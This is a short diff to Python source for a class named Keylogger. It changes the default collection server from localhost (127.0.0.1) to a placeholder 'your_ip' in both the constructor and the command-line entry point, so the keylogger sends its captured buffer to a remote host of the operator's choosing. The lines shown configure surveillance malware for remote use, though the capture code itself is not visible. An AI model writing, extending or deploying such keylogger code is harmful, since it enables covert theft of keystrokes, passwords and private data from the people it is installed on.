@@ -15,7 +15,7 @@ except ImportError:
     exit(1)
 
 class Keylogger:
-    def __init__(self, server_ip="127.0.0.1", server_port=8080):
+    def __init__(self, server_ip="your_ip", server_port=8080):
         self.server_ip = server_ip
         self.server_port = server_port  # Matches server default port
         self.buffer = ""
@@ -200,7 +200,7 @@ class Keylogger:
 
 if __name__ == "__main__":
     # Command line args
-    server_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+    server_ip = sys.argv[1] if len(sys.argv) > 1 else "your_ip"
     server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
     print(f"Connecting to {server_ip}:{server_port}")
